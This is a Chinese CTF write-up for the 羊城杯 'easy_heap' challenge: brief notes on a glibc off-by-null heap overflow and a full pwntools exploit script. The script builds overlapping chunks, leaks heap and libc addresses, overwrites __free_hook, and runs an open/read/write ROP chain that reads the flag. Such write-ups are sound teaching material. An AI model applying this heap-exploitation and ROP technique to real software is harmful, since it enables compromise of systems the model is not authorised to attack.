## glibc2.29-off_by_null

#### 羊城杯easy_heap

+ 空字节溢出，功能add，edit，delete，show
+ 禁用execve系统调用，使用orw读flag
+ 构造堆重叠，打freehook为setcontext劫持栈，由于本地是glibc2.31需要一个gadget把free参数(rdi)转换到rdx
+ 细节：setcontext在赋值rsp后，会push rcx寄存器，所以要构造好rcx处的偏移加个ret指令即可，根据源码rcx的位置正好在rsp后面

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

s       = lambda data               :sh.send(str(data))
sa      = lambda delim,data         :sh.sendafter(str(delim), str(data))
sl      = lambda data               :sh.sendline(str(data))
sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
rn      = lambda numb               :sh.recvn(numb)
rl      = lambda                    :sh.recvline()
irt     = lambda                    :sh.interactive()
pinfo   = lambda name,addr          :log.success('{} : {:#x}'.format(name, addr))

context(log_level = 'info', arch = 'amd64', os = 'linux')

elf = ELF('./ycb_2020_easy_heap',checksec=False)
DEBUG = 1

if DEBUG:
    libc = elf.libc
    sh = process(elf.path)
else:
    IP = 'node3.buuoj.cn'
    PORT = '26633'
    libc = ELF('../libc/libc-2.30.so',checksec=False)
    sh = remote(IP,PORT)

def add(size):
    sla('Choice:','1')
    sla('Size: ',str(size))

def edit(idx,con):
    sla('Choice:','2')
    sla('Index: ',str(idx))
    rl()
    s(con)

def dele(idx):
    sla('Choice:','3')
    sla('Index: ',str(idx))

def show(idx):
    sla('Choice:','4')
    sla('Index: ',str(idx))
    return ru('[+]Done!')

    

def pwn():
    for i in range(6):
        add(0x1000) #0~5

    add(0xbb0) #6
    for i in range(7):
        add(0x28) #7~13

    add(0xa20) #14
    add(0x28) #15 gap to top

    dele(14)
    add(0x1000) #14

    add(0x28) #16
    edit(16,p64(0)+p64(0x521)+'\x90')

    for i in range(4):
        add(0x28) #17~20

    for i in range(7):
        dele(7+i)

    dele(17)
    dele(19)

    for i in range(7):
        add(0x28) #alloc 7~13 back

    add(0x400) #17 trigger fastbin consolidate
    add(0x28) #19
    edit(19,p64(0)+'\x10')

    add(0x28) #21 clear tcache

    for i in range(7):
        dele(7+i)

    dele(18)
    dele(16)

    for i in range(7):
        add(0x28)

    add(0x28) #16 : alloc back victim
    edit(16,'\x10')

    add(0x28) # 18 clear tcache

    add(0x28) # 22 use for overflow
    add(0x4f0) #23
    edit(22,'A'*0x20+p64(0x520))
    dele(23) #trigger unlink
    
    dele(15) 
    dele(22)
    add(0x28) #15
    add(0x28) #22
    heap_base = u64(show(15)[-6:].ljust(8,'\x00'))-0x7a40 #leak heap
    pinfo('heap_base',heap_base)
    add(0xa0)  #23 use to write overlapped heap
    
    # -------- information ----------
    libc.addr = u64(show(23)[-6:].ljust(8,'\x00'))-0x1ec150
    pinfo('libc_base',libc.addr) 
    free_hook = libc.addr + libc.sym['__free_hook']
    pinfo('free_hook',free_hook)
    setcontext = libc.addr + libc.sym['setcontext']
    magic = 0x0000000000154930 + libc.addr #: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]
    syscall_r = 0x0000000000066229 + libc.addr
    pop_rax_r = 0x000000000004a550 + libc.addr
    pop_rdi_r = 0x0000000000026b72 + libc.addr
    pop_rsi_r = 0x0000000000027529 + libc.addr 
    pop_rdx_r12_r =  0x000000000011c371 + libc.addr 
    ret = 0x0000000000025679 + libc.addr
    
    flag_str_addr = heap_base + 0x2a0
    flag_con_addr = heap_base + 0x2f0
    ropchain_addr = heap_base + 0x22c0
    payload_addr = heap_base + 0x12c0

    payload = p64(0) + p64(payload_addr) + p64(0)*4 + p64(setcontext+0x3d) + (0xa0-0x28)*'\x00' + p64(ropchain_addr) + p64(ret)
    ropchain = flat([
        pop_rax_r,2,
        pop_rdi_r,flag_str_addr,
        pop_rsi_r,0,
        syscall_r,
        pop_rax_r,0,
        pop_rdi_r,3,
        pop_rsi_r,flag_con_addr,
        pop_rdx_r12_r,0x50,0,
        syscall_r,
        pop_rax_r,1,
        pop_rdi_r,1,
        pop_rsi_r,flag_con_addr,
        pop_rdx_r12_r,0x50,0,
        syscall_r
    ])
    # -------------------------------

    dele(7)
    dele(18)
    edit(23,'A'*0x48+p64(0x31)+p64(free_hook))
    add(0x28) #new7
    add(0x28) #new18 
    edit(18,p64(magic)) #write free_hook as magic gadget addr

    edit(0,'./flag\x00')
    edit(1,payload)
    edit(2,ropchain)
    #gdb.attach(sh)
    #use free to trigger attack
    dele(1) 
    irt()


if __name__ == '__main__':
    while True:
        try:
            pwn()
        except:
            sh.close()
            sh = process(elf.path)
            #sh = remote(IP,PORT)
            continue
        else:
            break
```

